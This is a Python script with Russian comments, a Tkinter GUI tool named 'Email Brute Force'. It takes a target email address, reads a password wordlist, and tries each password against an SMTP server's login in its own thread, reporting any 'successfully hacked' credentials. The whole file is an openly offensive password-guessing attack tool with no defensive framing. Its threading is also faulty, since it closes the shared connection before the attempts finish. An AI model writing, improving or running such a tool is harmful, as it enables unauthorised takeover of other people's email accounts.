import os
import smtplib
import tkinter as tk
import threading

# Функция для подбора пароля
def brute_force():
    email = email_entry.get()
    dictionary_file = os.path.join(os.path.dirname(__file__), 'dictionaries', 'hashkiller-dict.txt')

    smtp_server = 'smtp.example.com'
    port = 587

    server = smtplib.SMTP(smtp_server, port)
    server.starttls()

    successful_attempts = []
    unsuccessful_attempts = []

    # Функция для проверки пароля
    def check_password(password):
        nonlocal successful_attempts, unsuccessful_attempts
        try:
            server.login(email, password)
            successful_attempts.append(password)
            result_label.config(text=f"Успешно взломан email: {email}, пароль: {password}")
        except smtplib.SMTPAuthenticationError:
            unsuccessful_attempts.append(password)
            result_label.config(text=f"Не удалось взломать email: {email} с паролем: {password}")

    try:
        with open(dictionary_file, 'r') as file:
            for line in file:
                password = line.strip()
                t = threading.Thread(target=check_password, args=(password,))
                t.start()
    except FileNotFoundError:
        result_label.config(text="Файл с паролями не найден")
    finally:
        server.quit()

    successful_label.config(text=f"Успешные попытки: {', '.join(successful_attempts)}")
    unsuccessful_label.config(text=f"Неудачные попытки: {', '.join(unsuccessful_attempts)}")

# Создание графического интерфейса с черным фоном и окнами для успешных и неудачных попыток
root = tk.Tk()
root.title("Email Brute Force")
root.configure(bg='black')

# Добавление баннера сверху
banner_label = tk.Label(root, text="█▀▀ █▀▄▀█ ▄▀█ █ █░░   █▄▄ █▀█ █░█ ▀█▀\n██▄ █░▀░█ █▀█ █ █▄▄   █▄█ █▀▄ █▄█ ░█░", bg='cyan', fg='red')
banner_label.pack()

email_label = tk.Label(root, text="Email:", bg='black', fg='white')
email_label.pack()

email_entry = tk.Entry(root)
email_entry.pack()

brute_force_button = tk.Button(root, text="Взломать", command=brute_force, bg='black', fg='red')
brute_force_button.pack()

result_label = tk.Label(root, text="", bg='black', fg='white')
result_label.pack()

successful_label = tk.Label(root, text="", bg='black', fg='green')
successful_label.pack()

unsuccessful_label = tk.Label(root, text="", bg='black', fg='red')
unsuccessful_label.pack()

root.mainloop()